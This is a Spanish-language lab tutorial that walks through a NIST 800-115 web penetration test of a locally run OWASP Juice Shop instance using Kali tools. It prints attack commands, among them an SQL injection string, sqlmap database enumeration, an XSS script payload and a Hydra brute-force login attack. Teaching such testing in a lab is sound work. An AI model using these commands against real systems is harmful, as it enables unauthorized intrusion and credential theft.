![M1](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%201%402Menbrete1.png)

# **Práctica de Penetración en Aplicaciones Web Usando NIST 800-115 con Kali Linux**

En esta práctica, aplicaremos la metodología de **NIST 800-115** en un entorno de laboratorio utilizando **Kali Linux**. Nos enfocaremos en la evaluación de la seguridad de una aplicación web vulnerable, siguiendo cada una de las fases definidas en la guía.

------

## **📌 Objetivo de la Práctica**

- **Escanear y analizar vulnerabilidades** en una aplicación web.
- **Explotar una vulnerabilidad real** de inyección SQL o XSS.
- **Documentar hallazgos y mitigar riesgos**.

------

# **🔹 Paso 1: Instalación del Entorno de Pruebas**

## **🔹 Instalación de Docker en Kali Linux**

Antes de comenzar, necesitamos configurar un entorno de pruebas seguro utilizando **Docker** para ejecutar una aplicación web vulnerable.

### **📌 1.1: Instalar Docker en Kali Linux**

```bash
sudo apt update && sudo apt install docker.io -y
```

Verificar la instalación:

```bash
docker --version
```

### **📌 1.2: Descargar e Iniciar OWASP Juice Shop**

**OWASP Juice Shop** es una aplicación web intencionalmente vulnerable que utilizaremos en esta práctica.

```bash
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop
```

Verifica que la aplicación está corriendo visitando:

👉 **http://localhost:3000**

------

# **🔹 Paso 2: Fase de Descubrimiento (Reconocimiento y Análisis de Vulnerabilidades)**

## **🔹 2.1: Escaneo de Servicios con Nmap**

Ahora que la aplicación está en ejecución, escaneemos el host con **Nmap** para descubrir los servicios activos.

```bash
nmap -sS -A -T4 127.0.0.1 -p 3000
```

Explicación de los parámetros:

- `-sS` → Escaneo SYN sigiloso.
- `-A` → Detección de versión de servicios y SO.
- `-T4` → Velocidad agresiva.

### **📌 2.2: Escaneo de Vulnerabilidades con Nikto**

Nikto es una herramienta que permite encontrar vulnerabilidades en servidores web.

```bash
nikto -h http://localhost:3000
```

Esto nos mostrará posibles problemas en la configuración de seguridad del servidor web.

### **📌 2.3: Análisis con OWASP ZAP**

**OWASP ZAP** es un proxy de análisis que nos ayuda a detectar fallos de seguridad en aplicaciones web.

1. Abrir ZAP en Kali Linux:

   ```bash
   zaproxy &
   ```

2. **Configurar el navegador** para que use **ZAP como proxy** (`localhost:8080`).

3. Escanear la aplicación:

   - Introducir `http://localhost:3000` en la barra de direcciones de **ZAP**.
   - Clic en "Automated Scan".

4. **Revisar los resultados** y anotar vulnerabilidades detectadas.

------

# **🔹 Paso 3: Fase de Ataque (Explotación de Vulnerabilidades)**

En esta sección, **intentaremos explotar una vulnerabilidad detectada en la fase anterior**.

## **🔹 3.1: Explotación de SQL Injection con SQLMap**

Si **ZAP o Nikto** detectaron **SQL Injection**, podemos probar la explotación con `sqlmap`.

1. Intentamos inyectar manualmente en la barra de búsqueda de Juice Shop:

   ```bash
   ' OR 1=1 --
   ```

   Si obtenemos información inesperada, el sitio es vulnerable.

2. **Ejecutar SQLMap para la automatización**:

   ```bash
   sqlmap -u "http://localhost:3000/rest/products/search?q=1" --dbs
   ```

   - `--dbs`: Enumera las bases de datos disponibles.

3. **Extraer información sensible**:

   ```bash
   sqlmap -u "http://localhost:3000/rest/products/search?q=1" -D juice_shop --tables
   ```

------

## **🔹 3.2: Explotación de XSS con XSStrike**

Si en la fase de descubrimiento **OWASP ZAP** detectó una vulnerabilidad **Cross-Site Scripting (XSS)** en los comentarios del producto, podemos explotarla.

1. Ejecutar XSStrike para automatizar el ataque:

   ```bash
   xsstrike -u "http://localhost:3000/rest/products/1"
   ```

2. Insertar el siguiente payload en el campo de comentarios:

   ```html
   <script>alert('XSS Vulnerability Found!');</script>
   ```

3. Si el **script se ejecuta**, significa que la aplicación es vulnerable a **XSS reflejado**.

------

## **🔹 3.3: Robo de Credenciales con Hydra**

Si se detectó **autenticación débil** en Juice Shop, podemos probar un ataque de fuerza bruta.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" -V
```

Si Hydra encuentra una contraseña válida, podremos iniciar sesión como administrador.

------

# **🔹 Paso 4: Fase de Reporte (Documentación de Hallazgos y Mitigación)**

## **📌 4.1: Documentación de Hallazgos**

Un reporte de pruebas de seguridad debe incluir: ✅ **Resumen Ejecutivo**: Impacto del pentest.
✅ **Vulnerabilidades encontradas**: SQL Injection, XSS, autenticación débil.
✅ **Pruebas realizadas**: Comandos ejecutados y capturas de pantalla.
✅ **Evaluación de riesgo**: Clasificación de vulnerabilidades (Alta, Media, Baja).
✅ **Recomendaciones**: Medidas para mitigar cada vulnerabilidad.



![M2](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%203%402Menbrete2.png)